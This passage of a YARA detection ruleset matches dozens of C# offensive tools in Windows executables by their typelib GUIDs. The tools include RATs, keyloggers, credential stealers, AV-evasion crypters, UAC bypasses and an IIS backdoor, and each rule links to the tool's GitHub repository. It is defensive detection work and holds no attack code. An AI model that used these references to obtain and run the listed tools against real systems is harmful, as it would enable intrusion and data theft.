        $typelibguid1 = "2f00a05b-263d-4fcc-846b-da82bd684603" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Telegra_Csharp_C2 {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/sf197/Telegra_Csharp_C2"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "1d79fabc-2ba2-4604-a4b6-045027340c85" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpCompile {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/SpiderLabs/SharpCompile"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "63f81b73-ff18-4a36-b095-fdcb4776da4c" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Carbuncle {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/checkymander/Carbuncle"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "3f239b73-88ae-413b-b8c8-c01a35a0d92e" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_OSSFileTool {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/B1eed/OSSFileTool"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "207aca5d-dcd6-41fb-8465-58b39efcde8b" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Rubeus {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/GhostPack/Rubeus"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "658c8b7f-3664-4a95-9572-a3e5871dfc06" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Simple_Loader {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/cribdragg3r/Simple-Loader"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "035ae711-c0e9-41da-a9a2-6523865e8694" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Minidump {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/3xpl01tc0d3r/Minidump"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "15c241aa-e73c-4b38-9489-9a344ac268a3" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpBypassUAC {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/FatRodzianko/SharpBypassUAC"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "0d588c86-c680-4b0d-9aed-418f1bb94255" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpPack {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/Lexus89/SharpPack"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid1 = "b59c7741-d522-4a41-bf4d-9badddebb84a" ascii nocase wide
        $typelibguid2 = "fd6bdf7a-fef4-4b28-9027-5bf750f08048" ascii nocase wide
        $typelibguid3 = "6dd22880-dac5-4b4d-9c91-8c35cc7b8180" ascii nocase wide
        $typelibguid5 = "f3037587-1a3b-41f1-aa71-b026efdb2a82" ascii nocase wide
        $typelibguid6 = "41a90a6a-f9ed-4a2f-8448-d544ec1fd753" ascii nocase wide
        $typelibguid7 = "3787435b-8352-4bd8-a1c6-e5a1b73921f4" ascii nocase wide
        $typelibguid8 = "fdd654f5-5c54-4d93-bf8e-faf11b00e3e9" ascii nocase wide
        $typelibguid9 = "aec32155-d589-4150-8fe7-2900df4554c8" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Salsa_tools {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/Hackplayers/Salsa-tools"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "276004bb-5200-4381-843c-934e4c385b66" ascii nocase wide
        $typelibguid1 = "cfcbf7b6-1c69-4b1f-8651-6bdb4b55f6b9" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_WindowsDefender_Payload_Downloader {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/notkohlrexo/WindowsDefender-Payload-Downloader"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "2f8b4d26-7620-4e11-b296-bc46eba3adfc" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Privilege_Escalation {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/Mrakovic-ORG/Privilege_Escalation"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "ed54b904-5645-4830-8e68-52fd9ecbb2eb" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Marauder {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/maraudershell/Marauder"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "fff0a9a3-dfd4-402b-a251-6046d765ad78" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_AV_Evasion_Tool {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/1y0n/AV_Evasion_Tool"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "1937ee16-57d7-4a5f-88f4-024244f19dc6" ascii nocase wide
        $typelibguid1 = "7898617d-08d2-4297-adfe-5edd5c1b828b" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Fenrir {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/nccgroup/Fenrir"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "aecec195-f143-4d02-b946-df0e1433bd2e" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_StormKitty {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/LimerBoy/StormKitty"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "a16abbb4-985b-4db2-a80c-21268b26c73d" ascii nocase wide
        $typelibguid1 = "98075331-1f86-48c8-ae29-29da39a8f98b" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Crypter_Runtime_AV_s_bypass {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/netreverse/Crypter-Runtime-AV-s-bypass"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "c25e39a9-8215-43aa-96a3-da0e9512ec18" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_RunAsUser {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/atthacks/RunAsUser"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "9dff282c-93b9-4063-bf8a-b6798371d35a" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_HWIDbypass {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/yunseok/HWIDbypass"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "47e08791-d124-4746-bc50-24bd1ee719a6" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_XORedReflectiveDLL {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/r3nhat/XORedReflectiveDLL"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "c0e49392-04e3-4abb-b931-5202e0eb4c73" ascii nocase wide
        $typelibguid1 = "30eef7d6-cee8-490b-829f-082041bc3141" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Sharp_Suite {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/FuzzySecurity/Sharp-Suite"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "467ee2a9-2f01-4a71-9647-2a2d9c31e608" ascii nocase wide
        $typelibguid1 = "5611236e-2557-45b8-be29-5d1f074d199e" ascii nocase wide
        $typelibguid2 = "447edefc-b429-42bc-b3bc-63a9af19dbd6" ascii nocase wide
        $typelibguid3 = "eacaa2b8-43e5-4888-826d-2f6902e16546" ascii nocase wide
        $typelibguid4 = "a3b7c697-4bb6-455d-9fda-4ab54ae4c8d2" ascii nocase wide
        $typelibguid5 = "a5f883ce-1f96-4456-bb35-40229191420c" ascii nocase wide
        $typelibguid6 = "28978103-d90d-4618-b22e-222727f40313" ascii nocase wide
        $typelibguid7 = "252676f8-8a19-4664-bfb8-5a947e48c32a" ascii nocase wide
        $typelibguid8 = "414187db-5feb-43e5-a383-caa48b5395f1" ascii nocase wide
        $typelibguid9 = "0c70c839-9565-4881-8ea1-408c1ebe38ce" ascii nocase wide
        $typelibguid10 = "0a382d9a-897f-431a-81c2-a4e08392c587" ascii nocase wide
        $typelibguid11 = "629f86e6-44fe-4c9c-b043-1c9b64be6d5a" ascii nocase wide
        $typelibguid12 = "f0d28809-b712-4380-9a59-407b7b2badd5" ascii nocase wide
        $typelibguid13 = "956a5a4d-2007-4857-9259-51cd0fb5312a" ascii nocase wide
        $typelibguid14 = "53f622eb-0ca3-4e9b-9dc8-30c832df1c7b" ascii nocase wide
        $typelibguid15 = "72019dfe-608e-4ab2-a8f1-66c95c425620" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_rat_shell {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/stphivos/rat-shell"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "7a15f8f6-6ce2-4ca4-919d-2056b70cc76a" ascii nocase wide
        $typelibguid1 = "1659d65d-93a8-4bae-97d5-66d738fc6f6c" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_dotnet_gargoyle {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/countercept/dotnet-gargoyle"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "76435f79-f8af-4d74-8df5-d598a551b895" ascii nocase wide
        $typelibguid1 = "5a3fc840-5432-4925-b5bc-abc536429cb5" ascii nocase wide
        $typelibguid2 = "6f0bbb2a-e200-4d76-b8fa-f93c801ac220" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_aresskit {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/BlackVikingPro/aresskit"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "8dca0e42-f767-411d-9704-ae0ba4a44ae8" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DLL_Injector {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/tmthrgd/DLL-Injector"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "4581a449-7d20-4c59-8da2-7fd830f1fd5e" ascii nocase wide
        $typelibguid1 = "05f4b238-25ce-40dc-a890-d5bbb8642ee4" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_TruffleSnout {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/dsnezhkov/TruffleSnout"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "33842d77-bce3-4ee8-9ee2-9769898bb429" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Anti_Analysis {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NYAN-x-CAT/Anti-Analysis"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "3092c8df-e9e4-4b75-b78e-f81a0058a635" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_BackNet {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/valsov/BackNet"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "9fdae122-cd1e-467d-a6fa-a98c26e76348" ascii nocase wide
        $typelibguid1 = "243c279e-33a6-46a1-beab-2864cc7a499f" ascii nocase wide
        $typelibguid2 = "a7301384-7354-47fd-a4c5-65b74e0bbb46" ascii nocase wide
        $typelibguid3 = "982dc5b6-1123-428a-83dd-d212490c859f" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_AllTheThings {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/johnjohnsp1/AllTheThings"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "0547ff40-5255-42a2-beb7-2ff0dbf7d3ba" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_AddReferenceDotRedTeam {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/ceramicskate0/AddReferenceDotRedTeam"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "73c79d7e-17d4-46c9-be5a-ecef65b924e4" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Lime_Crypter {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NYAN-x-CAT/Lime-Crypter"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "f93c99ed-28c9-48c5-bb90-dd98f18285a6" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_BrowserGhost {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/QAX-A-Team/BrowserGhost"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "2133c634-4139-466e-8983-9a23ec99e01b" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpShot {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/tothi/SharpShot"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "057aef75-861b-4e4b-a372-cfbd8322c8e1" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Offensive__NET {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/mrjamiebowman/Offensive-.NET"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "11fe5fae-b7c1-484a-b162-d5578a802c9c" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_RuralBishop {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/rasta-mouse/RuralBishop"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "fe4414d9-1d7e-4eeb-b781-d278fe7a5619" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DeviceGuardBypasses {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/tyranid/DeviceGuardBypasses"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "f318466d-d310-49ad-a967-67efbba29898" ascii nocase wide
        $typelibguid1 = "3705800f-1424-465b-937d-586e3a622a4f" ascii nocase wide
        $typelibguid2 = "256607c2-4126-4272-a2fa-a1ffc0a734f0" ascii nocase wide
        $typelibguid3 = "4e6ceea1-f266-401c-b832-f91432d46f42" ascii nocase wide
        $typelibguid4 = "1e6e9b03-dd5f-4047-b386-af7a7904f884" ascii nocase wide
        $typelibguid5 = "d85e3601-0421-4efa-a479-f3370c0498fd" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_AMSI_Handler {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/two06/AMSI_Handler"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "d829426c-986c-40a4-8ee2-58d14e090ef2" ascii nocase wide
        $typelibguid1 = "86652418-5605-43fd-98b5-859828b072be" ascii nocase wide
        $typelibguid2 = "1043649f-18e1-41c4-ae8d-ac4d9a86c2fc" ascii nocase wide
        $typelibguid3 = "1d920b03-c537-4659-9a8c-09fb1d615e98" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_RAT_TelegramSpyBot {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/SebastianEPH/RAT.TelegramSpyBot"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "8653fa88-9655-440e-b534-26c3c760a0d3" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_TheHackToolBoxTeek {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/teeknofil/TheHackToolBoxTeek"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "2aa8c254-b3b3-469c-b0c9-dcbe1dd101c0" ascii nocase wide
        $typelibguid1 = "afeff505-14c1-4ecf-b714-abac4fbd48e7" ascii nocase wide
        $typelibguid2 = "4cf42167-a5cf-4b2d-85b4-8e764c08d6b3" ascii nocase wide
        $typelibguid3 = "118a90b7-598a-4cfc-859e-8013c8b9339c" ascii nocase wide
        $typelibguid4 = "3075dd9a-4283-4d38-a25e-9f9845e5adcb" ascii nocase wide
        $typelibguid5 = "295655e8-2348-4700-9ebc-aa57df54887e" ascii nocase wide
        $typelibguid6 = "74efe601-9a93-46c3-932e-b80ab6570e42" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_USBTrojan {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/mashed-potatoes/USBTrojan"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "4eee900e-adc5-46a7-8d7d-873fd6aea83e" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_IIS_backdoor {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/WBGlIl/IIS_backdoor"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "3fda4aa9-6fc1-473f-9048-7edc058c4f65" ascii nocase wide
        $typelibguid1 = "73ca4159-5d13-4a27-8965-d50c41ab203c" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_ShellGen {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/jasondrawdy/ShellGen"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "c6894882-d29d-4ae1-aeb7-7d0a9b915013" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Mass_RAT {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NYAN-x-CAT/Mass-RAT"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "6c43a753-9565-48b2-a372-4210bb1e0d75" ascii nocase wide
        $typelibguid1 = "92ba2a7e-c198-4d43-929e-1cfe54b64d95" ascii nocase wide
        $typelibguid2 = "4cb9bbee-fb92-44fa-a427-b7245befc2f3" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Browser_ExternalC2 {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/mdsecactivebreach/Browser-ExternalC2"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "10a730cd-9517-42d5-b3e3-a2383515cca9" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_OffensivePowerShellTasking {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/leechristensen/OffensivePowerShellTasking"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "d432c332-3b48-4d06-bedb-462e264e6688" ascii nocase wide
        $typelibguid1 = "5796276f-1c7a-4d7b-a089-550a8c19d0e8" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_DoHC2 {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/SpiderLabs/DoHC2"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "9877a948-2142-4094-98de-e0fbb1bc4062" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SyscallPOC {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/SolomonSklash/SyscallPOC"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "1e54637b-c887-42a9-af6a-b4bd4e28cda9" ascii nocase wide
        $typelibguid1 = "198d5599-d9fc-4a74-87f4-5077318232ad" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Pen_Test_Tools {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/awillard1/Pen-Test-Tools"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "922e7fdc-33bf-48de-bc26-a81f85462115" ascii nocase wide
        $typelibguid1 = "ad5205dd-174d-4332-96d9-98b076d6fd82" ascii nocase wide
        $typelibguid2 = "b67e7550-f00e-48b3-ab9b-4332b1254a86" ascii nocase wide
        $typelibguid3 = "5e95120e-b002-4495-90a1-cd3aab2a24dd" ascii nocase wide
        $typelibguid4 = "295017f2-dc31-4a87-863d-0b9956c2b55a" ascii nocase wide
        $typelibguid5 = "abbaa2f7-1452-43a6-b98e-10b2c8c2ba46" ascii nocase wide
        $typelibguid6 = "a4043d4c-167b-4326-8be4-018089650382" ascii nocase wide
        $typelibguid7 = "51abfd75-b179-496e-86db-62ee2a8de90d" ascii nocase wide
        $typelibguid8 = "a06da7f8-f87e-4065-81d8-abc33cb547f8" ascii nocase wide
        $typelibguid9 = "ee510712-0413-49a1-b08b-1f0b0b33d6ef" ascii nocase wide
        $typelibguid10 = "9780da65-7e25-412e-9aa1-f77d828819d6" ascii nocase wide
        $typelibguid11 = "7913fe95-3ad5-41f5-bf7f-e28f080724fe" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_The_Collection {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/Tlgyt/The-Collection"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "579159ff-3a3d-46a7-b069-91204feb21cd" ascii nocase wide
        $typelibguid1 = "5b7dd9be-c8c3-4c4f-a353-fefb89baa7b3" ascii nocase wide
        $typelibguid2 = "43edcb1f-3098-4a23-a7f2-895d927bc661" ascii nocase wide
        $typelibguid3 = "5f19919d-cd51-4e77-973f-875678360a6f" ascii nocase wide
        $typelibguid4 = "17fbc926-e17e-4034-ba1b-fb2eb57f5dd3" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Change_Lockscreen {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/nccgroup/Change-Lockscreen"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "78642ab3-eaa6-4e9c-a934-e7b0638bc1cc" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_LOLBITS {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/Kudaes/LOLBITS"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "29d09aa4-ea0c-47c2-973c-1d768087d527" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_Keylogger {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/BlackVikingPro/Keylogger"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "7afbc9bf-32d9-460f-8a30-35e30aa15879" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_CVE_2020_1337 {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/neofito/CVE-2020-1337"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "d9c2e3c1-e9cc-42b0-a67c-b6e1a4f962cc" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_SharpLogger {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/djhohnstein/SharpLogger"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "36e00152-e073-4da8-aa0c-375b6dd680c4" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule HKTL_NET_GUID_AsyncRAT_C_Sharp {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp"
        author = "Arnim Rupp"
        date = "2020-12-13"
    strings:
        $typelibguid0 = "619b7612-dfea-442a-a927-d997f99c497b" ascii nocase wide
        $typelibguid1 = "424b81be-2fac-419f-b4bc-00ccbe38491f" ascii nocase wide
        $typelibguid2 = "37e20baf-3577-4cd9-bb39-18675854e255" ascii nocase wide
        $typelibguid3 = "dafe686a-461b-402b-bbd7-2a2f4c87c773" ascii nocase wide
        $typelibguid4 = "ee03faa9-c9e8-4766-bd4e-5cd54c7f13d3" ascii nocase wide
        $typelibguid5 = "8bfc8ed2-71cc-49dc-9020-2c8199bc27b6" ascii nocase wide
        $typelibguid6 = "d640c36b-2c66-449b-a145-eb98322a67c8" ascii nocase wide
